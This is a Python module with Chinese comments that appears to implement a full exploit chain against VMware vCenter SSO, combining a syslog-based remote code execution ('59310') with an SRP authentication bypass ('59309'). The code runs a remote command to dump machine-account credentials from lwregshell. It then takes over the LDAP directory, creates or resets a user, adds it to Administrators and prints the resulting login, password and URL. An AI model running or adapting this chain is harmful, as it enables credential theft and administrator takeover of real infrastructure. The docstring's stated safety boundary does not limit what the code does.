"""一键打通（Full Chain）：59310/59309 联动，交付可登录 /ui 的 SSO 管理员。

流程（任一路径成功即继续，失败自动降级）：
  S0 指纹
  S1 59310 RCE（UDP 514 → TCP 514 → TLS 1514 依次尝试，全部一次性 cron）
  S2 凭据收集（机器账户 DN/密码 —— 目标端 lwregshell 原样输出、本地转义还原）
  S3 目录接管，三条路按序尝试：
       3a 机器账户 simple bind（LDAPS 636 → LDAP 389）      ← 来自 59310，首选
       3b 59309 SRP 绕过（身份 = administrator@<S2 推导域>）
       3c 59309 SRP 绕过（默认 vsphere.local；仅 59309 可达时）
  S4 账户落地（已存在 → 改密复用；否则新建 + 加入 Administrators）
  S5 验证交付（新账户 LDAP bind 回验 + Administrators 组成员确认）
  S6 登记清理 + 交付卡片

安全边界：交付账户即终点 —— 不做 /ui 登录后的动作、ESXi 横向、持久化。
"""
import re
import time

from .berldap import (connect_ldap, op_bind_simple, parse_bind_response,
                      op_search, op_add, op_modify, collect_search,
                      parse_ldap_result, has_srp)
from .recon import probe_target
from .srp59309 import srp_bypass_bind
from .syslog59310 import rce_readback
from .util import rand_name

_LWREG_LINE = re.compile(r'"([^"]*)"\s+REG_SZ\s+"(.*)"')

# 经 59310 RCE 执行的凭据收集命令（整体 base64 封装传输，无引号问题）
MACHINE_CREDS_CMD = (
    "R=/opt/likewise/bin/lwregshell; "
    "$R list_values '[HKEY_THIS_MACHINE\\services\\vmdir]' 2>/dev/null | "
    "grep -E 'dcAccountDN|dcAccountPassword'; echo UID=$(id -u)"
)


def parse_lwreg_value(line):
    """解析 lwregshell 输出行并还原转义：\\" → "，\\\\ → \\。

    实测输出行形如 `+  "dcAccountDN"  REG_SZ  "cn=..."`（带 + 前缀），
    因此用 search 而非 match，取最后一个带引号值为准。"""
    m = _LWREG_LINE.search(line.strip())
    if not m:
        return None
    v = m.group(2)
    return v.replace("\\\\", "\x00").replace('\\"', '"').replace("\x00", "\\")


def extract_machine_creds(output):
    """从 RCE 输出提取机器账户 DN 与密码。返回 (dn, password)，缺失为 None。"""
    dn = pw = None
    for line in output.splitlines():
        if "dcAccountDN" in line:
            dn = parse_lwreg_value(line) or dn
        elif "dcAccountPassword" in line:
            pw = parse_lwreg_value(line) or pw
    return dn, pw


def domain_from_dn(dn):
    """cn=x,ou=Domain Controllers,dc=vsphere,dc=local → vsphere.local"""
    parts = [p.strip() for p in dn.split(",")
             if p.strip().lower().startswith("dc=")]
    return ".".join(p[3:] for p in parts)


def base_from_dn(dn):
    parts = [p.strip() for p in dn.split(",")
             if p.strip().lower().startswith("dc=")]
    return ",".join(parts)


def _rce_variants(host, port, proto, fp):
    """59310 的传输尝试顺序：用户指定优先，再按开放端口补 UDP/TCP/TLS。"""
    out = []
    if proto in ("udp", "tcp", "tls"):
        out.append(("%s:%d/%s" % (host, port, proto.upper()), port,
                    proto in ("tcp", "tls"), proto == "tls"))
    if fp.get("514tcp") and all(not (v[1] == 514 and v[2]) for v in out):
        out.append(("%s:514/TCP" % host, 514, True, False))
    if fp.get("1514") and not any(v[1] == 1514 for v in out):
        out.append(("%s:1514/TLS" % host, 1514, True, True))
    if not any(v[1] == 514 and not v[2] for v in out):
        out.append(("%s:514/UDP" % host, 514, False, False))
    return out


class ChainResult:
    def __init__(self, ok, card, steps, upn=None, password=None, udn=None,
                 via=None, elapsed=0):
        self.ok = ok
        self.card = card
        self.steps = steps
        self.upn = upn
        self.password = password
        self.udn = udn
        self.via = via
        self.elapsed = elapsed


def run_chain(host, *, user=None, password=None, use_59310=True, use_59309=True,
              syslog_port=514, proto="udp", vami_port=5480, proxy=None,
              rce_wait=200, log=lambda s: None, stop_flag=None):
    """执行全链路。log 为输出回调；stop_flag 置位后在阶段边界退出。"""
    t0 = time.time()
    steps = []
    host = host.strip().split(":")[0]
    user = user or ("pentest_" + rand_name(4))
    password = password or (rand_name(10) + "!Aa1" + rand_name(2))

    def step(name, ok, detail=""):
        steps.append((name, ok, detail))
        log("[%s] %s%s" % ("+" if ok else "!", name, (" — " + detail) if detail else ""))

    def stopped():
        return stop_flag is not None and stop_flag.is_set()

    log("[*] [S0] 指纹 → %s" % host)
    try:
        fp = probe_target(host, proxy=proxy, log=log)
    except Exception as e:
        fp = {}
        log("[!] [S0] 指纹异常: %r" % e)
    log("[*] [S0] %s" % fp.get("conclusion", "?"))

    # ---- S1+S2: 59310 RCE → 机器账户 + SSO 域 ----
    dn = pw = None
    domain = None
    if use_59310 and not stopped():
        for label, p, tcp, tls in _rce_variants(host, syslog_port, proto, fp):
            if stopped():
                break
            log("[*] [S1] 59310 RCE（%s）… 一次性 cron，约 60s 回显" % label)
            ok, text = rce_readback(host, p, MACHINE_CREDS_CMD, rand_name(6),
                                    tcp=tcp, tls=tls, vami_port=vami_port,
                                    proxy=proxy, timeout=rce_wait,
                                    poll_cb=log, stop_flag=stop_flag)
            if not ok:
                step("S1 59310 RCE（%s）" % label, False, text)
                continue
            dn, pw = extract_machine_creds(text)
            uid = re.search(r"UID=(\d+)", text)
            if dn and pw:
                step("S2 机器账户提取", True,
                     "%s（密码 %d 字符）" % (dn, len(pw)))
                domain = domain_from_dn(dn)
                log("[*] [S2] SSO 域: %s" % domain)
                break
            # RCE 已生效但凭据缺失 —— 换传输方式也不会变，直接转 59309 降级
            step("S1 59310 RCE（%s）" % label, True,
                 "RCE 生效（uid=%s）但凭据输出缺失 — 转 59309 降级"
                 % (uid.group(1) if uid else "?"))
            break
    elif not use_59310:
        step("S1 59310", True, "按配置跳过")

    # ---- S3: 目录接管 ----
    conn = None
    via = None
    if dn and pw:
        for p, tls in ((636, True), (389, False)):
            if stopped():
                break
            try:
                log("[*] [S3a] 机器账户 bind → %s:%d（%s）"
                    % (host, p, "LDAPS" if tls else "LDAP"))
                c = connect_ldap(host, p, tls, 8)
                c.send_op(op_bind_simple(dn.encode(), pw.encode()))
                _i, _t, val = c.recv_op()
                code, diag, _s = parse_bind_response(val)
                if code == 0:
                    conn = c
                    via = "59310 → 机器账户 simple bind（%s:%d）" % (host, p)
                    step("S3a 机器账户接管", True, via)
                    break
                c.close()
                log("[!] [S3a] bind code=%s %s" %
                    (code, diag.decode("utf-8", "replace")[:80]))
            except Exception as e:
                log("[!] [S3a] %s:%d 失败: %r" % (host, p, e))
    if conn is None and use_59309 and not stopped():
        ident = "administrator@" + (domain or "vsphere.local")
        for p, tls in ((636, True), (389, False), (2020, False)):
            if stopped():
                break
            try:
                log("[*] [S3b] 59309 绕过 → %s:%d 身份=%s" % (host, p, ident))
                c = connect_ldap(host, p, tls, 8)
                r = srp_bypass_bind(c, ident, "auto", log=log)
                if r.ok:
                    conn = c
                    via = "59309 SRP 绕过（%s:%d as %s）" % (host, p, ident)
                    step("S3b 59309 接管", True, via)
                    break
                c.close()
                log("[!] [S3b] %s:%d 失败: %s" % (host, p, r.msg))
            except Exception as e:
                log("[!] [S3b] %s:%d 异常: %r" % (host, p, e))

    if conn is None:
        card = ("✘ 未打通\n"
                "  目标     : %s\n"
                "  原因     : 三条目录接管路径均失败（明细见上方与日志）\n"
                "  建议     : 确认 389/636 可达；59310 侧检查 VAMI 回显端口；\n"
                "             携带运行日志回传维护者" % host)
        return ChainResult(False, card, steps, elapsed=int(time.time() - t0))

    # ---- S4: 账户落地 ----
    base = base_from_dn(dn) if dn else None
    if not base:
        conn.send_op(op_search("", scope=0, attrs=["namingContexts"]))
        entries, _c = collect_search(conn)
        ncs = [v for _d, at in entries for v in at.get("namingContexts", [])]
        base = ncs[0] if ncs else "dc=vsphere,dc=local"
    dom = domain or base.replace("dc=", "").replace(",", ".").replace(" ", "")
    udn = "cn=%s,cn=Users,%s" % (user, base)
    upn = "%s@%s" % (user, dom)

    conn.send_op(op_search(udn, scope=0, attrs=["cn"]))
    entries, _c = collect_search(conn)
    if entries:
        log("[*] [S4] 账户已存在 → 重置密码复用")
        conn.send_op(op_modify(udn, [(2, "userPassword", [password])]))
        _i, _t, val = conn.recv_op()
        code, diag = parse_ldap_result(val)
        if code != 0:
            card = "✘ 未打通\n  账户 %s 已存在但改密失败 code=%s" % (udn, code)
            return ChainResult(False, card, steps, elapsed=int(time.time() - t0))
        step("S4 复用既有账户", True, udn)
    else:
        conn.send_op(op_add(udn, [
            ("objectClass", ["top", "person", "organizationalPerson", "user"]),
            ("cn", [user]), ("sn", [dom]), ("givenName", [user]),
            ("sAMAccountName", [user]), ("userPrincipalName", [upn]),
            ("uid", [user]), ("userPassword", [password]),
        ]))
        _i, _t, val = conn.recv_op()
        code, diag = parse_ldap_result(val)
        if code != 0:
            card = ("✘ 未打通\n  创建用户失败 code=%s %s"
                    % (code, diag.decode("utf-8", "replace")[:120]))
            return ChainResult(False, card, steps, elapsed=int(time.time() - t0))
        step("S4 创建用户", True, "%s（UPN %s）" % (udn, upn))

    conn.send_op(op_modify("cn=Administrators,cn=Builtin," + base,
                           [(0, "member", [udn])]))
    _i, _t, val = conn.recv_op()
    code, diag = parse_ldap_result(val)
    if code == 0 or code == 20:          # 20 = 已是成员
        step("S4 加入 Administrators", True,
             "新增" if code == 0 else "原本已是成员")
    else:
        step("S4 加入 Administrators", False,
             diag.decode("utf-8", "replace")[:120])

    # ---- S5: 验证交付 ----
    bind_ok = False
    for p, tls in ((636, True), (389, False)):
        try:
            c = connect_ldap(host, p, tls, 8)
            c.send_op(op_bind_simple(udn.encode(), password.encode()))
            _i, _t, val = c.recv_op()
            code, _d, _s = parse_bind_response(val)
            c.close()
            if code == 0:
                step("S5 bind 回验", True, "%s:%d 以新账户认证成功" % (host, p))
                bind_ok = True
                break
        except Exception:
            continue
    if not bind_ok:
        step("S5 bind 回验", False, "新账户认证未通过（密码策略/复制延迟？）")

    conn.send_op(op_search("cn=Administrators,cn=Builtin," + base, scope=0,
                           attrs=["member"]))
    entries, _c = collect_search(conn)
    members = [m for _d, at in entries for m in at.get("member", [])]
    in_group = any(m.lower() == udn.lower() for m in members)
    step("S5 组成员确认", in_group,
         "Administrators 成员数 %d" % len(members))

    ok = bind_ok and in_group
    elapsed = int(time.time() - t0)
    if ok:
        card = "\n".join([
            "✔ 全链路打通",
            "  登录地址 : https://%s/ui" % host,
            "  账户     : %s" % upn,
            "  密码     : %s" % password,
            "  路径     : %s" % via,
            "  DN       : %s" % udn,
            "  耗时     : %dm%02ds" % (elapsed // 60, elapsed % 60),
            "  清理     : ldapdelete '%s'（已登记 ⑥ 清理中心）" % udn,
        ])
    else:
        card = ("✘ 部分完成\n  账户 %s（密码 %s）已落地但验证未全过，\n"
                "  明细见上方步骤；可登录 https://%s/ui 手工确认" %
                (upn, password, host))
    return ChainResult(ok, card, steps, upn=upn, password=password, udn=udn,
                       via=via, elapsed=elapsed)
